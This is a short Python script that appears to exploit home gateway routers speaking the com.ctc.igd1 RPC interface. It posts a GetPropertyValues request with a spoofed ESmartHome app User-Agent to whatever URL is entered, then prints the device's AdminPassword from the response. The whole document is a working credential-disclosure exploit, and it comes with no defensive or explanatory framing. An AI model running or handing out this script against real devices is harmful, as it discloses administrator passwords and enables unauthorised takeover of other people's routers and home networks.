import requests

headers = {
    'SDKVersion':'3.6.2.1',
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en-US;q=0.9,en;q=0.8',
    'User-Agent': 'ESmartHome/5.7.1 (iPhone; iOS 18.1.1; Scale/3.00)',
    'Connection': 'close',
    'Cache-Control': 'max-age=0',
}

url=input("URL:")

data = {
    "ServiceName": "com.ctc.igd1",
    "Params": [
        {
            "InterfaceName": "com.ctc.igd1.HTTPServer",
            "Properties": [],
            "ObjectPath": "/com/ctc/igd1/Network/HTTPServer"
        }
    ],
    "RPCMethod": "GetPropertyValues"
}

response = requests.post(url, headers=headers, json=data)

if response.status_code == 200 or response.json()["Result"]!="0":
    try:
        print("PASS:", response.json()["Params"][0]["Properties"][0]["AdminPassword"])
    except KeyError:
        if response.json()["Result"]!="0":
            print("FAIL, Result:",response.json()["Result"])
        else:
            print("FAIL, json:",response.json())
else:
    try:
        print("FAIL, Result:",response.json()["Result"])
    except KeyError:
        print(f"FAIL, httpcode: {response.status_code}")
